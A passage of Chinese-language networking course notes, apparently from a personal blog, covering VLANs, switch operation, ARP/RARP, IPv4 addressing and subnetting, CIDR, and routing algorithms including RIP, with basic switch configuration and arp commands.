id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>共享型以太数据帧处理</p><p><img src="/../image/image-20240916204639756.png" alt="image-20240916204639756"></p><p>交换型以太数据帧处理</p><p><img src="/../image/image-20240916204743942.png" alt="image-20240916204743942"></p><p>CAM表</p><p>指MAC地址与交换机端口的二元组映射关系。</p><ul><li>交换型以太网中，实现有针对性地数据帧转发</li><li>基于源MAC地址学习，源MAC地址与端口建立映射关系</li><li>基于目的MAC地址转发，得到响应的MAC地址与端口建立映射关系</li></ul><h2 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h2><h3 id="VLAN的概念"><a href="#VLAN的概念" class="headerlink" title="VLAN的概念"></a>VLAN的概念</h3><p>虚拟局域网(VirtuaI LAN，VLAN)是由一些局域网网段构成的可跨越不同物理网段、不同网络类型的逻辑网络</p><p>每一个VLAN的帧都有一个明确的标识符，指明发送这个帧的工作站是属于哪-个VLAN。</p><h3 id="VLAN的特点"><a href="#VLAN的特点" class="headerlink" title="VLAN的特点"></a>VLAN的特点</h3><p>一个虚拟工作组可以跨越不同的交换机来组成一个广播域。</p><p>虚拟局域网支持任意多个站点间的组合，一个站点或工作组可以属于多个虚拟工作组。</p><p>虚拟局域网可大大简化网络的管理</p><p>虚拟局域网允许管理员在中央节点来配置和管理网络</p><p>虚拟局域网为网络设备的变更和扩充提供了一种有效的手段。</p><h3 id="VLAN的信息交换方式"><a href="#VLAN的信息交换方式" class="headerlink" title="VLAN的信息交换方式"></a>VLAN的信息交换方式</h3><ul><li>端口交换:把端口配置到一个或若干个背板连接共享HUB上，独立的由端口组合的共享网络段，每一个连接到端口上的用户被分配到其中一个段上。</li><li>帧交换:交换机每一个端口能提供一个独立的共享网络端口，在此端口上既可以连接共享HUB，也可以连接单独客户站。</li><li>信元交换:核心是由一个或多个ATM交换机组成，在ATM交换机上实现信元交换</li></ul><h3 id="VLAN的分类"><a href="#VLAN的分类" class="headerlink" title="VLAN的分类"></a>VLAN的分类</h3><p>(1)按交换机端口划分:按交换机的端口来划分虚拟局域网，将同一虚拟工作组的端口设置成具有相同的广播域的虚拟子网，只允许同一广播域端口之间互相通信，各虚拟子网之间相对独立。由端口划分的虚拟局域网称为物理层虚拟局域网</p><p>(2)按MAC地址划分:该虚拟工作组的广播域是按用户工作站的MAC地址来划分的，又称为链路层虚拟局域网。</p><p>(3)按IP地址划分:是根据IP地址来定义虚拟局域网，又称为网络层虚拟局域网</p><p>(4)按应用划分:根据应用所需的网络带宽和服务质量级别来定义虚拟局域网</p><p><img src="/../image/image-20240916213013176.png" alt="image-20240916213013176"></p><h3 id="VLAN的路由"><a href="#VLAN的路由" class="headerlink" title="VLAN的路由"></a>VLAN的路由</h3><p>虚拟局域网主要采用集中式路由和分布式路由</p><p>集中式路由策略是指所有虚拟局域网都通过一个中心路由器实现互连</p><p>分布式路由策略是将路由选择功能适当地分布在带有路由功能的交换机上。</p><h3 id="VLAN的管理"><a href="#VLAN的管理" class="headerlink" title="VLAN的管理"></a>VLAN的管理</h3><p>虚拟局域网是通过网络管理软件实现的。</p><p>网络管理软件运行在与交换机相连的网管工作站上，负责网络配置、性能监控故障检测与诊断以及网络安全性等方面的网络管理。</p><p>网络管理软件通常采用图形化的用户界面(GUI)，易于操作和理解，</p><h2 id="交换机工作原理"><a href="#交换机工作原理" class="headerlink" title="交换机工作原理"></a>交换机工作原理</h2><h3 id="交换机原理与应用"><a href="#交换机原理与应用" class="headerlink" title="交换机原理与应用"></a>交换机原理与应用</h3><h4 id="冲突域"><a href="#冲突域" class="headerlink" title="冲突域"></a>冲突域</h4><p>竞争同一带宽的节点集合。</p><p>传统的基于共享式集线器(HUB)的局域网中所有站点都处于同一个“冲突域”中。</p><h4 id="广播域"><a href="#广播域" class="headerlink" title="广播域"></a>广播域</h4><p>接收同样广播消息的节点的集合。交换机和HUB组成的网络是一个广播域。</p><p>路由器的一个接口下是一个广播域。所以路由器可以隔离广播域。</p><p><img src="/../image/image-20240916213220413.png" alt="image-20240916213220413"></p><h4 id="网络拓扑结构"><a href="#网络拓扑结构" class="headerlink" title="网络拓扑结构"></a>网络拓扑结构</h4><ul><li>总线型:结构简单、费用少、故障诊断困难</li><li>星型:结构简单、存在单点故障;</li><li>环形:结构简单、存在单点故障;</li><li>网状:可靠性高、网络复杂成本高;</li></ul><h4 id="网络环路"><a href="#网络环路" class="headerlink" title="网络环路"></a>网络环路</h4><p>影响:产生网络风暴，造成网络拥塞;</p><p>解决方法:结构设计时避免环路;生成树协议(STP)，树是没有环路的，所有的数据都只在树所指示的路径上传输。</p><p><img src="/../image/image-20240916214220809.png" alt="image-20240916214220809"></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>MAC地址表:交换机端口与主机的MAC地址的对应关系，可初始化并自动学习。</p><p>转发:位于mac地址表中的单帧数据。</p><p>广播:广播、组播、未知单帧数据。</p><p><img src="/../image/image-20240916214322201.png" alt="image-20240916214322201"></p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>1、MAC地址表初始化</p><p>2、MAC地址表学习</p><p>3、单帧转发</p><p>4、广播、组播和未知单播帧的转发</p><p><img src="/../image/image-20240916214346105.png" alt="image-20240916214346105"></p><h4 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h4><p>Local Area Network)的中文名为“虚拟局域网”路由器可直接隔离广播，(Virtua交换机则使用VLAN隔离广播。</p><p>VLAN标签:交换机用VLAN标签来区分不同VLAN的以太网帧。</p><p>Access端口:仅允许一个VLAN通过，用于连接终端。</p><p>Trunk端口:允许多个VLAN通过，用于交换机之间连接</p><p><img src="/../image/image-20240916214422756.png" alt="image-20240916214422756"></p><h5 id="vlan通信原理"><a href="#vlan通信原理" class="headerlink" title="vlan通信原理"></a>vlan通信原理</h5><p><img src="/../image/image-20240916214442819.png" alt="image-20240916214442819"></p><p><img src="/../image/image-20240916214451470.png" alt="image-20240916214451470"></p><h4 id="三层交换机"><a href="#三层交换机" class="headerlink" title="三层交换机"></a>三层交换机</h4><p>同时具备交换机的转发能力和路由器的路由功能。</p><p>一般应用与核心及主干网络</p><p><img src="/../image/image-20240916214533809.png" alt="image-20240916214533809"></p><h3 id="网络设备基本调试"><a href="#网络设备基本调试" class="headerlink" title="网络设备基本调试"></a>网络设备基本调试</h3><h4 id="连通性测试："><a href="#连通性测试：" class="headerlink" title="连通性测试："></a>连通性测试：</h4><p>Ping命令</p><p>TTL:最大值255，推荐值64</p><p>Tracert命令</p><p><img src="/../image/image-20240916214636452.png" alt="image-20240916214636452"></p><p><img src="/../image/image-20240916220527060.png" alt="image-20240916220527060"></p><h4 id="访问网络设备"><a href="#访问网络设备" class="headerlink" title="访问网络设备"></a>访问网络设备</h4><p>Console口本地访问</p><p>使用Telnet终端访问使用SSH终端访问</p><p>(超级终端、Xshell、secureCRT)</p><p><img src="/../image/image-20240916214850750.png" alt="image-20240916214850750"></p><h4 id="命令行视图"><a href="#命令行视图" class="headerlink" title="命令行视图"></a>命令行视图</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户视图:登陆显示</span><br><span class="line">Router&gt;</span><br><span class="line">特权视图:用户视图下输入enable进入</span><br><span class="line">Router&gt;enable</span><br><span class="line">Router#</span><br><span class="line">配置视图:特权视图下输入configure terminal进入</span><br><span class="line">Router#configure terminal</span><br><span class="line">Enter configuration commands, one per line. End with CNTL/ZRouter(config)#</span><br></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><img src="/../image/image-20240916215057133.png" alt="image-20240916215057133"></p><h4 id="VLAN基本配置"><a href="#VLAN基本配置" class="headerlink" title="VLAN基本配置"></a>VLAN基本配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建VLAN并进入VLAN视图</span><br><span class="line">Switch(config)#vlan &lt;vlan-id&gt;</span><br><span class="line">Switch(config-vlan)#</span><br><span class="line">进入端口视图将端口加入VLAN(配置端口类型为Access)</span><br><span class="line">Switch(config)#interface fastEthernet 0/1</span><br><span class="line">Switch(config-if)#switchport mode accessl</span><br><span class="line">Switch(config-if)#switchport access vlan &lt;vlan-id&gt;</span><br><span class="line">配置端口类型为Trunk</span><br><span class="line">Switch(config)#interface fastEthernet 0/1</span><br><span class="line">Switch(config-if)#switchport mode trunk</span><br><span class="line">Switch(config-if)#switchport trunk allowed vlan &lt; vlan-id/all&gt;</span><br></pre></td></tr></table></figure><h2 id="ARP协议与RARP协议"><a href="#ARP协议与RARP协议" class="headerlink" title="ARP协议与RARP协议"></a>ARP协议与RARP协议</h2><p><a href="https://cloud.tencent.com/developer/article/1948193">https://cloud.tencent.com/developer/article/1948193</a></p><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><h4 id="TCP-x2F-IP分层结构"><a href="#TCP-x2F-IP分层结构" class="headerlink" title="TCP&#x2F;IP分层结构"></a>TCP&#x2F;IP分层结构</h4><p><img src="/../image/image-20240916215620728.png" alt="image-20240916215620728"></p><h4 id="地址解析协议-Address-Resolution-Protoco"><a href="#地址解析协议-Address-Resolution-Protoco" class="headerlink" title="地址解析协议 Address Resolution Protoco"></a>地址解析协议 Address Resolution Protoco</h4><p>在局域网中，当主机或其它网络设备有数据要发送给另一个主机或设备时，它必须知道对方的网络层地址(即IP地址)。</p><p>但是仅仅有IP地址是不够的，因为IP数据报文必须封装成帧才能通过物理网络发送，因此发送站还必须有接收站的物理地址，所以需要一个从IP地址到物理地址的映射，APR就是实现这个功能的协议，</p><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>主机以广播的方式，发送包含目标IP地址的包到网络上的所有主机，然后接收返回信息，以此来确定目标地址的MAC地址，收到响应信息后，将IP地址和MAC地址的映射缓存一段时间(下次请求可以先查缓存，这样节省时间)。</p><h4 id="MAC地址–Media-Access-ControlMAC-Medium-x2F-Media-Access-Control-地址"><a href="#MAC地址–Media-Access-ControlMAC-Medium-x2F-Media-Access-Control-地址" class="headerlink" title="MAC地址–Media Access ControlMAC(Medium&#x2F;Media Access Control)地址"></a>MAC地址–Media Access ControlMAC(Medium&#x2F;Media Access Control)地址</h4><p>用来表示互联网上每一个站点的标识符，采用十六进制数表示，共六个字节(48位)。其中，前三个字节是由IEEE的注册管理机构RA负责给不同厂家分配的代码(高位24位)，也称为“编制上唯一的标识符(Organizationally Unique ldentifier)，后三个字节(低位24位)由各厂家自行指派给生产的适配器接口，称为扩展标识符(唯一性)</p><p><strong>MAC:40-A3-CC-AD-E0-43</strong></p><h4 id="发送过程"><a href="#发送过程" class="headerlink" title="发送过程"></a>发送过程</h4><p>先在自己的缓存中查找有没有目的MAC地址和IP地址的映射关系:</p><p>如果有，就用IP与MAC地址的对应关系，将MAC地址按照协议写入MAC帧，然后局域网发送MAC帧;</p><p>如果没有，就发送广播MAC帧请求，FF-FF-FF-FF-FF-FF，主机B接收到后，向A发送ARP响应分组，响应分组中是包括IP与MAC的对应关系的。主机A会将这个对应关系进行缓存，下次使用。</p><h4 id="分组格式"><a href="#分组格式" class="headerlink" title="分组格式"></a>分组格式</h4><p><img src="/../image/image-20240916215824832.png" alt="image-20240916215824832"></p><h4 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h4><p><img src="/../image/image-20240916215900337.png" alt="image-20240916215900337"></p><h4 id="ARP命令"><a href="#ARP命令" class="headerlink" title="ARP命令"></a>ARP命令</h4><p>Linux下 man arp，查看使用方式</p><p><img src="/../image/image-20240916220420626.png" alt="image-20240916220420626"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br><span class="line">arp -n</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240916220457936.png" alt="image-20240916220457936"></p><p>Window下直接打arp</p><p><img src="/../image/image-20240916220549862.png" alt="image-20240916220549862"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240916220622465.png" alt="image-20240916220622465"></p><h3 id="实验-使用Wireshark抓取ARP数据包"><a href="#实验-使用Wireshark抓取ARP数据包" class="headerlink" title="实验:使用Wireshark抓取ARP数据包"></a>实验:使用Wireshark抓取ARP数据包</h3><p><img src="/../image/image-20240916220817395.png" alt="image-20240916220817395"></p><p>ARP协议在什么时候工作?</p><p>正常情况下不会收到ARP应答，如果收到，则表明本网络中存在与自身IP地址重复的地址</p><p>为什么ARP数据包目的地址不是FF-FF-FF-FF-FF-FF?</p><p>什么时候会发送目的地址为FF-FF-FF-FF-FF-FF的ARP包?</p><p>如果在ARP缓存表中没有找到相对应的IP地址，主机A就会在网络上发送一个广播，目标MAC地址是“FF.FF.FF.FF.FF.FF”</p><p>这种机制有什么问题?</p><p><strong>ARP欺骗</strong></p><h3 id="RARP协议"><a href="#RARP协议" class="headerlink" title="RARP协议"></a>RARP协议</h3><p>反向地址解析协议。将主机的MAC地址转换为IP地址，比如局域网中有一台主机只知道MAC地址而不知道IP地址，那么可以通过RARP协议发出征求自身IP地址的广播请求，然后由RARP服务器负责回答。RARP协议广泛用于获取无盘工作站的IP地址</p><p>RARP是一种逝去的地址分配技术，是Bootp和DHCP的鼻祖，目前只有部分无盘工作站等情况需要用到。</p><h2 id="网络层协议基础"><a href="#网络层协议基础" class="headerlink" title="网络层协议基础"></a>网络层协议基础</h2><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p><img src="/../image/image-20240916230846922.png" alt="image-20240916230846922"></p><h4 id="网络层-1"><a href="#网络层-1" class="headerlink" title="网络层"></a>网络层</h4><p>1、具体功能</p><ul><li>路由选择、拥塞控制和网际互联等。</li></ul><p>2、研究和解决的主要问题为传输层提供服务</p><ul><li>路由选择</li><li>流量控制</li><li>网络连接的建立、保持和终止</li></ul><p>IP(Internet Protocol)协议是整个TCP&#x2F;IP网络的核心协议，它将各个局域网和广域网互连成一个有统一地址、统一分组格式和相同服务特性的IP网络。</p><p><img src="/../image/image-20240916230933629.png" alt="image-20240916230933629"></p><h4 id="网际协议IP及其配套协议"><a href="#网际协议IP及其配套协议" class="headerlink" title="网际协议IP及其配套协议"></a>网际协议IP及其配套协议</h4><p><img src="/../image/image-20240916230957767.png" alt="image-20240916230957767"></p><h4 id="IPV4协议"><a href="#IPV4协议" class="headerlink" title="IPV4协议"></a>IPV4协议</h4><p><img src="/../image/image-20240916231023698.png" alt="image-20240916231023698"></p><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><p>IP地址(IPV4)是给每个连接在因特网上的主机分配一个在全球范围是唯一的32bit的标识符。</p><p>IP地址采用分层结构，即由网络地址和主机地址两部分组成，网络地址用来标识接入Internet的网络。主机地址用来标识接入Internet的主机。</p><p><img src="/../image/image-20240916233142537.png" alt="image-20240916233142537"></p><p><img src="/../image/image-20240917001719398.png" alt="image-20240917001719398"></p><h3 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h3><p><img src="/../image/image-20240917001728711.png" alt="image-20240917001728711"></p><h4 id="A类IP地址"><a href="#A类IP地址" class="headerlink" title="A类IP地址"></a>A类IP地址</h4><p>网络字段的第一位是固定的:0</p><p>A类IP地址第一字节的范围是:1~127</p><p><img src="/../image/image-20240917001748045.png" alt="image-20240917001748045"></p><p>网络号 1.0.0.0~126.0.0.0</p><p>网络127保留用于本地软件环回测试本主机之用。</p><p>可用网络数:126(2^7-2)</p><p>每个网络的主机数:16,777,214(2^24-2)</p><p>A类地址空间共有2^31(2147483648)个地址，占整个IP地址空间的50%</p><h4 id="B类IP地址"><a href="#B类IP地址" class="headerlink" title="B类IP地址"></a>B类IP地址</h4><p>网络字段的前两位是固定的:10</p><p>B类第一字节范围:128~191</p><p><img src="/../image/image-20240917001904283.png" alt="image-20240917001904283"></p><p>网络号128.0.0.0~191.255.0.0</p><p>可用网络数16384(2^14)</p><p>每个网络的主机数 65534(2^16-2)</p><p>整个B类地址空间共有2^30(1073741824)个地址，占整个IP地址空间的25%</p><h4 id="C类IP地址"><a href="#C类IP地址" class="headerlink" title="C类IP地址"></a>C类IP地址</h4><p>网络字段的前三位是固定的:110</p><p>C类地址范围:192~223</p><p><img src="/../image/image-20240917001941996.png" alt="image-20240917001941996"></p><p>网络号 192.0.0.0~223.255.255.0</p><p>可用网络数 2097152(2^21)</p><p>每个网络的主机数 254(2^8-2)</p><p>整个C类地址空间共有229((536870912)个地址，占整个IP地址的12.5%。</p><p>广播地址:32位全为“1”的IP地址，是用于向网上(本地)所有主机发送报文的广播地址。</p><p>有限广播:主机号各位全为“1”的IP地址，用于本网广播，叫做有限(定向)广播地址。</p><p>“0”地址:各位全为“0”的网络地址，表示本地网络</p><p>回送地址:A类网络地址127，它是一个保留地址，用于网络软件以及本地进程间通信。</p><h3 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h3><p>随着Internet的发展，两级地址结构很难满足日益增长的网络的需求，并日益显现出下面的缺点。</p><p>IP地址的浪费。目前的IP地址分类方案有不合理之处，因而造成许多地址的浪费。</p><p>路由器效率低下。给每一个网络分配一个网络号会使路由表变得太大因而使网络性能变坏。</p><p>解决问题方法:<strong>划分子网</strong>和<strong>构造超网</strong></p><p><img src="/../image/image-20240917002127674.png" alt="image-20240917002127674"></p><p><img src="/../image/image-20240917002138306.png" alt="image-20240917002138306"></p><p><img src="/../image/image-20240917002210210.png" alt="image-20240917002210210"></p><h3 id="网络掩码"><a href="#网络掩码" class="headerlink" title="网络掩码"></a>网络掩码</h3><p>子网掩码是用来标识网络号和主机号的</p><p>“1”对应的IP地址位标识网络号(包含子网号)</p><p>“0”对应的IP地址位标识主机号</p><p><img src="/../image/image-20240917002405373.png" alt="image-20240917002405373"></p><p><img src="/../image/image-20240917002418377.png" alt="image-20240917002418377"></p><h5 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h5><p><strong>用来标识网络位和主机位的方式。</strong></p><p>前N位全取1，后32-N位全取0，得到掩码的表示形式</p><p>掩码与IPv4地址作与运算则可得到对应的网络位地址</p><p>遮掩对应IPv4地址的主机位，仅保留其网络位的效果</p><p><img src="/../image/image-20240917005129662.png" alt="image-20240917005129662"></p><h5 id="掩码的表示方式"><a href="#掩码的表示方式" class="headerlink" title="掩码的表示方式"></a>掩码的表示方式</h5><p>点分十进制:表示为255.0.0.0</p><p>&#x2F;网络位位数:表示为&#x2F;8</p><p><strong>A、B和C类地址的掩码表示方式</strong></p><p>A类地址:255.0.0.0或&#x2F;8</p><p>B类地址:255.255.0.0或&#x2F;16</p><p>C类地址:255.255.255.0或&#x2F;24</p><h3 id="无类域间路由"><a href="#无类域间路由" class="headerlink" title="无类域间路由"></a>无类域间路由</h3><p>CIDR消除了“子网”的概念，使IP地址从三级编址又回到了两级编址。它的记法是<br><strong>IP地址 ∷:&#x3D;{&lt;网络前缀&gt;，&lt;主机号 &gt;}</strong><br>CIDR使用“<strong>斜线记法</strong>”或CIDR记法，它在IP地址后面加上一个斜线“&#x2F;”，写上网络前缀所占的比特数(对应于子网掩码中比特1的个数)。<br>例如128.14.32.0&#x2F;20表示的地址块共2^12个地址。其地址范围是:128.14.32.0-128.14.47.255</p><h4 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h4><p>网络前缀越短，其地址块所包含的地址数就越多。</p><p>在查找路由表时可能会得到不止一个匹配结果，应当从匹配结果中选择具有最长网络前缀的路由，这叫做最长前缀匹配，又称最长匹配或最佳匹配</p><h4 id="无类域间路由的技术特点"><a href="#无类域间路由的技术特点" class="headerlink" title="无类域间路由的技术特点"></a>无类域间路由的技术特点</h4><p>使用网络前缀和主机号的二级地址结构，不再使用子网的概念;</p><p>网络前缀相同的连续的IP地址形成一个地址块，由起始地址和块地址数来表示</p><h4 id="无类域间路由的优点"><a href="#无类域间路由的优点" class="headerlink" title="无类域间路由的优点"></a>无类域间路由的优点</h4><p>解决了困扰传统IP寻址的两大问题:</p><p>减小Internet的路由条目。</p><h4 id="无类域间路由对应的掩码"><a href="#无类域间路由对应的掩码" class="headerlink" title="无类域间路由对应的掩码"></a>无类域间路由对应的掩码</h4><p><img src="/../image/image-20240917200150814.png" alt="image-20240917200150814"></p><h4 id="CIDR与VLSM比较"><a href="#CIDR与VLSM比较" class="headerlink" title="CIDR与VLSM比较"></a>CIDR与VLSM比较</h4><p>CIDR是将网络位进行缩小，利于汇总，减小路由条目;</p><p>VLSM则是将主机位进行细分为子网位，更合理的分配IP地址</p><h2 id="路由原理"><a href="#路由原理" class="headerlink" title="路由原理"></a>路由原理</h2><h3 id="路由基础"><a href="#路由基础" class="headerlink" title="路由基础"></a>路由基础</h3><h4 id="路由的概念"><a href="#路由的概念" class="headerlink" title="路由的概念"></a>路由的概念</h4><p>名词:route，为需要跨网络转发的数据包提供的路径信息</p><p><img src="/../image/image-20240917201311023.png" alt="image-20240917201311023"></p><p>路由协议:路由器之间分享路由信息所需要遵循的标准</p><p><img src="/../image/image-20240917201324406.png" alt="image-20240917201324406"></p><p>动词:routing，依据逻辑地址对跨网络的数据包执行转发</p><p><img src="/../image/image-20240917201342410.png" alt="image-20240917201342410"></p><h4 id="路由器-1"><a href="#路由器-1" class="headerlink" title="路由器"></a>路由器</h4><p>路由器(Router)是工作在OSI&#x2F;RM第三层(网络层)的数据包转发设备。路由器的主要功能是路由选择(Routing)</p><p>路由器可以连接多个网络或网段，对不同网络或网段之间的数据信息进行“翻译”从而构成一个更大的网络,</p><h5 id="路由器的分类"><a href="#路由器的分类" class="headerlink" title="路由器的分类"></a>路由器的分类</h5><p>模块化结构可以灵活地配置路由器，按需更换路由器模块，以适应企业的业务需求。</p><p>固定配置结构的路由器只能提供固定接口。</p><p>骨干级路由器是实现大型网络互联的关键设备，多用于电信运营商和大型企业</p><p>企业级路由器主要面向连接对象较多，但系统相对简单且数据流量较小的用户</p><p>接入级路由器主要应用于连接家庭或小型企业客户群体。</p><h4 id="路由及路由原理"><a href="#路由及路由原理" class="headerlink" title="路由及路由原理"></a>路由及路由原理</h4><p>路由指分组从源节点到目的节点的传输路线。这条传输路径由路由选择算法来选取</p><p>因此，路由选择算法的好坏直接关系到网络资源的利用率和网络性能的高低。</p><p>例如:现实生活中的邮件收发过程</p><blockquote><p>小李写信装进信封;</p><p>小李将邮件投递给邮局</p><p>邮局根据信封地址找到小王</p><p>小王收信拆开信封。</p></blockquote><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>按照某种规则在一对源节点和目的节点之间的多条路由中选择一条最佳路由的方法叫做路由选择算法，简称路由算法。路由选择算法分为静态路由选择算法和动态路由选择算法两大类。</p><h4 id="静态路由选择算法"><a href="#静态路由选择算法" class="headerlink" title="静态路由选择算法"></a>静态路由选择算法</h4><p>静态路由选择算法不用测量也不需要利用网络信息，路由选择在网络设计时或网络安装时已经设置好，是一种按照某种固定规则进行的路由选择。</p><h4 id="扩散式路由选择"><a href="#扩散式路由选择" class="headerlink" title="扩散式路由选择"></a>扩散式路由选择</h4><p>一个网络节点从某条线路收到一个分组后，向除该线路外的所有线路重复发送收到的分组。</p><p>基本思想:把分组发送给除发送节点以外的所有邻节点，各节点收到重复分组时都有废弃能力(扩散式，全路发送)</p><p><img src="/../image/image-20240917214354070.png" alt="image-20240917214354070"></p><p>各节点第一次收到分组时，就继续向目的地方向发送，经其他节点，直至目的地节点;</p><p>除了第一次收到的分组外，其它重复收到的分组将被废弃</p><p>网络资源利用率低，但可靠性高。</p><p><strong>适用范围:规模小、负荷轻的网络</strong></p><p>选择扩散式(多路发送)</p><p>基本思想:选择向着靠近目的节点方向的一部分节点发送分组。</p><h4 id="固定式路由选择"><a href="#固定式路由选择" class="headerlink" title="固定式路由选择"></a>固定式路由选择</h4><p>网络中的网络控制中心按照最佳路由选择算法求出每对源、目的节点之间的最佳路由为每一个节点构造一个固定路由表并分发给各节点。每个网络节点的表格中每一项记录着对应某个目的节点的下一个节点或链路。</p><p>优点:简便易行，在负载稳定，拓扑结构变化不大的网络中运行效果较好</p><p>缺点:灵活性差。</p><p><img src="/../image/image-20240923210446493.png" alt="image-20240923210446493"></p><p><img src="/../image/image-20240923210544552.png" alt="image-20240923210544552"></p><h4 id="随机路由选择"><a href="#随机路由选择" class="headerlink" title="随机路由选择"></a>随机路由选择</h4><p>转发节点随机地选择一个链路发送分组，如果选择各个链路的概率相同，则可用循环方式轮流的把各个分组转发到所有相邻的节点。</p><p>优点:是简单易行，对网络负载的增加小。</p><p>缺点:是分组在网络中迂回旅行的时间过长</p><p>静态路由选择算法只适宜小型的、结构相对稳定的计算机网络。</p><h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><p>动态路由选择算法的节点的路由选择要依靠网络当前的状态信息来决定。它能较好地适应网络流量、拓扑结构的变化，有利于改善网络的性能，因此又称为自适应路由选择算法。</p><p>独立路由选择:利用本地信息进行分布式控制:</p><p>集中路由选择:利用相邻节点的信息进行集中式控制;</p><p>分布路由选择:利用全网节点的信息进行分布式控制;</p><h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><p>路由选择协议也称为路由协议，是执行路由选择算法的协议，是路由器之间实现路由信息共享的一种机制，它允许路由器之间相互交换和维护各自的路由表。</p><p>TCP&#x2F;IP网络的路由协议分为两大类:内部网关协IGP(InteriorGatewayProtocol)和外部网关协议EGP(External Gateway Protocol)。IGP用于自治系统或管理域之内，而EGP用于自治系统之间或管理域之间。</p><h4 id="自治系统和内部网关协议"><a href="#自治系统和内部网关协议" class="headerlink" title="自治系统和内部网关协议"></a>自治系统和内部网关协议</h4><p>内部网关协议IGP:具体的协议有多种，如RIP和OSPF等</p><p>外部网关协议EGP:目前使用的协议是BGP</p><p><img src="/../image/image-20240923212419261.png" alt="image-20240923212419261"></p><h4 id="不同的路由协议执行不同的路由算法"><a href="#不同的路由协议执行不同的路由算法" class="headerlink" title="不同的路由协议执行不同的路由算法"></a>不同的路由协议执行不同的路由算法</h4><p>适用于单播的路由算法分为:V-D(向量距离)和L-S(链路状态)两大类。</p><p>适用于组播的路由算法分位:SBT(源树路由)和CBT(核心树路由)两大类。</p><p><img src="/../image/image-20240923212512188.png" alt="image-20240923212512188"></p><h3 id="路由选路及原理"><a href="#路由选路及原理" class="headerlink" title="路由选路及原理"></a>路由选路及原理</h3><h4 id="路由表与路由条目"><a href="#路由表与路由条目" class="headerlink" title="路由表与路由条目"></a>路由表与路由条目</h4><p>路由表:路由条目的集合</p><p>路由条目:记录特定目的IP地址与转发接口的某类表项</p><p><img src="/../image/image-20240923212602771.png" alt="image-20240923212602771"></p><p>每台路由设备中都至少维护着一张路由表</p><p>路由器必须依赖路由表中的信息来转发数据包</p><ul><li>如果路由表中没有与数据包目的IP地址相关的路由条目，路由器就只能丢弃数据包</li><li>如果路由表中有多条与数据包目的IP地址相关的路由条目，路由器需要依据一些规则选出“最优路由”并以此执行转发。</li></ul><h4 id="在华为设备上查看路由表"><a href="#在华为设备上查看路由表" class="headerlink" title="在华为设备上查看路由表"></a>在华为设备上查看路由表</h4><p>displayip routing-table</p><p><img src="/../image/image-20240923212714748.png" alt="image-20240923212714748"></p><h2 id="常见动态路由协议"><a href="#常见动态路由协议" class="headerlink" title="常见动态路由协议"></a>常见动态路由协议</h2><h3 id="RIP路由协议"><a href="#RIP路由协议" class="headerlink" title="RIP路由协议"></a>RIP路由协议</h3><p>RIP是一种内部网关协议，结构简单，适用于小型网络。它运行于UDP之上，缺省的端口号是512。RIP是一种分布式的基于距离向量的路由选择协议，RIP协议的“距离也称为“跳数(hop count)”</p><ul><li>从一路由器到直接连接的网络的距离定义为0。从一路由器到非直接连接的网络的距离定义为所经过路由器数加1。</li><li>RIP支持的最大跳数是15，跳数为16的网络被认为不可达。因此RIP只适用于<strong>小型互联网</strong>。</li></ul><h4 id="交换路由信息"><a href="#交换路由信息" class="headerlink" title="交换路由信息"></a>交换路由信息</h4><ul><li><p>如果两个路由器之间的通信不需要经过另一个路由器，则它们是相邻的。</p></li><li><p>两个相邻路由器在同一个网络上都有自己的接口。</p></li><li><p>RIP 协议规定，对于不相邻的路由器就不交换信息。RIP协议仅和相邻路由器交换信息</p></li><li><p>交换的信息:“到本自治系统中所有网络的(最短)距离，以及到每个网络应经过的下一跳路由器”</p></li><li><p>至于本路由器怎样获得这些信息以及路由表是否完整，都是不重要的。</p></li><li><p>RIP 协议交换的是当前本路由器所知道的全部信息，即路由表</p></li><li><p>RIP 协议按固定的时间间隔交换路由信息。例如，每隔30秒。然后路由器根据收到的路由信息更新路由表。即采用周期驱动方式</p></li><li><p>当网络拓扑发生变化时，路由器也及时向相邻路由器通告拓扑变化后的路由信息</p></li></ul><h4 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h4><ul><li>仅和相邻路由器交换信息。</li><li>交换的信息是当前本路由器所知道的全部信息，即自己的路由表。</li><li>按固定的时间间隔交换路由信息，当网络拓扑发生变换时，路由器也要及时向相邻路由器通告拓扑变化后的路由信息。</li><li>RIP不能在两个网络之间同时使用多条路由。RIP选择一条具有最少路由器的路由RIP协议的每一个路由器都要不断地和其他一些路由器交换路由信息。</li></ul><h4 id="路由表的初始化"><a href="#路由表的初始化" class="headerlink" title="路由表的初始化"></a>路由表的初始化</h4><p>路由器启动时对路由表进行初始化，为与自己直接相连的每个网络生成一个表项。</p><p>路由表中最主要的信息是:到某个网络的距离，以及应经过的下一跳地址。</p><p><img 